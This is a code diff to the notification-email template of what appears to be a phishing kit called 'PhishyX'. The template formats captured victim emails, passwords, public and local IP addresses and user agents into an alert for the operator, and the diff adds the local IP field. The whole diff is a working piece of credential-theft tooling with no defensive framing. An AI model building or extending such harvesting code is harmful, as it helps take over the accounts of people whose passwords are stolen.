@@ -2,6 +2,7 @@ export function generateCredentialsEmail(
   email: string,
   password: string,
   ip: string,
+  localIp: string,
   userAgent: string
 ): { subject: string; html: string; text: string } {
   const subject = `[PhishyX] New credentials captured`;
@@ -65,10 +66,19 @@ export function generateCredentialsEmail(
 
                 <tr style="border-bottom:1px solid #1e1e1e;">
                   <td style="padding:14px 20px;background:#161616;width:120px;">
-                    <p style="margin:0;color:#888888;font-size:11px;letter-spacing:1px;text-transform:uppercase;">IP</p>
+                    <p style="margin:0;color:#888888;font-size:11px;letter-spacing:1px;text-transform:uppercase;">Public IP</p>
                   </td>
                   <td style="padding:14px 20px;background:#161616;">
                     <p style="margin:0;color:#aaaaaa;font-size:13px;">${ip}</p>
+                  </td>
+                </tr>
+
+                <tr style="border-bottom:1px solid #1e1e1e;">
+                  <td style="padding:14px 20px;background:#111111;width:120px;">
+                    <p style="margin:0;color:#888888;font-size:11px;letter-spacing:1px;text-transform:uppercase;">Local IP</p>
+                  </td>
+                  <td style="padding:14px 20px;background:#111111;">
+                    <p style="margin:0;color:#aaaaaa;font-size:13px;">${localIp}</p>
                   </td>
                 </tr>
 
@@ -101,7 +111,7 @@ export function generateCredentialsEmail(
 </body>
 </html>`;
 
-  const text = `[PhishyX] Credential Capture\n\nTimestamp : ${timestamp}\nEmail     : ${email}\nPassword  : ${password}\nIP        : ${ip}\nUser-Agent: ${userAgent}`;
+  const text = `[PhishyX] Credential Capture\n\nTimestamp : ${timestamp}\nEmail     : ${email}\nPassword  : ${password}\nPublic IP : ${ip}\nLocal IP  : ${localIp}\nUser-Agent: ${userAgent}`;
 
   return { subject, html, text };
 }
